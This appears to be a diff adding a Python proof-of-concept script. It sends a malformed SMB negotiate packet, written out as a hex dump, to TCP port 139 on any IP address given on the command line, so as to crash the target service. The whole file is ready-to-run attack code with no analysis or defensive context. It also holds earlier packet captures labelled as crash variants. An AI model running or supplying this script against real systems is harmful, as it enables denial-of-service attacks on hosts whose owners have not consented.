@@ -1,0 +1,99 @@
+import socket,sys,binascii,struct
+
+crash_hex_whole = r'''
+0000000 0c00 f229 d08e 0c00 c929 8dee 0008 0045
+0000010 f600 e977 0040 0640 463e a8c0 5801 a8c0
+0000020 2a01 769b 8b00 5edc 1c4f 0162 d6d4 1880
+0000030 e500 bb84 0000 0101 0a08 7520 2049 0700
+0000040 8e10 0000 be00 53ff 424d 0072 0000 1800
+0000050 c843 0000 0000 0000 0000 0000 0000 0000
+0000060 fffe 0000 0000 9b00 0200 4350 4e20 5445
+0000070 4f57 4b52 5020 4f52 5247 4d41 3120 302e
+0000080 0200 494d 5243 534f 464f 2054 454e 5754
+0000090 524f 534b 3120 302e 0033 4d02 4349 4f52
+00000a0 4f53 5446 4e20 5445 4f57 4b52 2053 2e33
+00000b0 0030 4c02 4e41 414d 314e 302e 0200 4d4c
+00000c0 2e31 5832 3030 0032 4402 534f 4c20 4e41
+00000d0 414d 324e 312e 0200 414c 4d4e 4e41 2e32
+00000e0 0031 5302 6d61 6162 0200 544e 4c20 4e41
+00000f0 414d 204e 2e31 0030 4e02 2054 4d4c 3020
+0000100 312e 0032                              
+0000104
+
+ '''
+
+crash_hex = r'''
+0000000 0000 be00 53ff 424d 0072 0000 1800 c843
+0000010 0000 0000 0000 0000 0000 0000 0000 fffe
+0000020 0000 0000 9b00 0200 4350 4e20 5445 4f57
+0000030 4b52 5020 4f52 5247 4d41 3120 302e 0200
+0000040 494d 5243 534f 464f 2054 454e 5754 524f
+0000050 534b 3120 302e 0033 4d02 4349 4f52 4f53
+0000060 5446 4e20 5445 4f57 4b52 2053 2e33 0030
+0000070 4c02 4e41 414d 314e 302e 0200 4d4c 2e31
+0000080 5832 3030 0032 4402 534f 4c20 4e41 414d
+0000090 324e 312e 0200 414c 4d4e 4e41 2e32 0031
+00000a0 5302 6d61 6162 0200 544e 4c20 4e41 414d
+00000b0 204e 2e31 0030 4e02 2054 4d4c 3020 312e
+00000c0 0032                                   
+00000c2
+'''
+crash_hex_2 = r'''
+0000000 0000 be00 53fe 424d 0072 0000 f300 a0d6
+0000010 8581 4318 00c8 f300 80a0 ffbc 0000 1800
+0000020 c843 0000 a0f3 bc80 cb00 0090 0000 0000
+0000030 0000 0000 0000 fffe 0000 0000 9b00 0200
+0000040 4350 4e20 5445 0057 0000 ffbe 4d53 7242
+0000050 0000 0000 4318 00c8 f300 80a0 00bc 0000
+0000060 0000 0000 0000 0000 fe00 00ff 0000 0000
+0000070 009b 5002 2043 454e 5754 524f 204b 5250
+0000080 474f 4152 204d 2e31 0030 4d02 4349 4f52
+0000090 4f53 5446 4e20 5445 4f57 0000 be00 53ff
+00000a0 424d 0072 0000 1800 c843 0000 a0f3 bc80
+00000b0 0000 0000 0000 0000 0000 0000 fffe 0000
+00000c0 0000
+
+'''
+
+def text2hex(string):
+    hex = ''
+    index = 0
+    for line in string.split(' '):
+        line = line.split('\n')[0]
+        if len(line) != 4:
+            continue
+        index += 1
+        if index < 0:
+            continue
+        #hex += '\\x' + line[-2:] + '\\x' + line[:2]
+        hex += line[-2:] + line[:2]
+        hex1 = line[-2:]
+        hex2 = line[:2]
+        #hex += line
+    #print(hex)
+    return hex
+
+
+
+hex = text2hex(crash_hex_2)
+
+
+def open_connection(ip):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip,139))
+    return s
+
+def send_crash(ip):
+    s = open_connection(ip)
+    #data = bytes(hex,encoding='utf8')
+    data = bytes.fromhex(hex)
+    print(data)
+    #print('[+]sending crash_bytes ..'.format(crash_bytes))
+    s.send(data)
+    s.close()
+
+if __name__ == '__main__':
+    if len(sys.argv) != 2:
+        print('[+]useage: {} ip'.format(sys.argv[0]))
+        sys.exit()
+    send_crash(sys.argv[1])
